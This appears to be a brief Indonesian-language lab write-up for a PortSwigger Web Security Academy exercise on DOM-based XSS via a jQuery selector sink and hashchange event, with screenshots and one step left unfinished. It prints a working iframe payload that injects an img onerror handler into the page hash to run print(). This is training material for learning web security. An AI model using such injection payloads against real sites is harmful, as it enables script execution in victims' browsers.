# LAB 5 jQuery selector sink using a hashchange event

## Brief: 
vulnerabilty dilaman home, fungsi pemilih jQuery $ () untuk auto-scroll ke pos tertentu, yang judulnya dilewatkan melalui properti location.hash.
	
## Tujuan: 

lakukan print() ke korban

<img width="1922" height="1046" alt="brief" src="https://github.com/user-attachments/assets/78f52d96-bb7c-49f0-b9e5-f99bcb8d8412" />

## Analisa:

1. liat source html vulnerable
	
<img width="1699" height="1025" alt="1 js bahaya" src="https://github.com/user-attachments/assets/8a280f56-8185-4df6-829e-556562d18098" />

2. pergi ke exploit server
	
<img width="1922" height="1046" alt="2" src="https://github.com/user-attachments/assets/bb391dc9-ff5d-4c1a-947c-9854abf2de17" />

3. tambahkan ke bodi:
	
       <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

   ini akan memanggil 		
		
4. dan kirim ke korban

<img width="1922" height="1046" alt="5" src="https://github.com/user-attachments/assets/65a21f01-eb18-472b-8269-395506260cf4" />
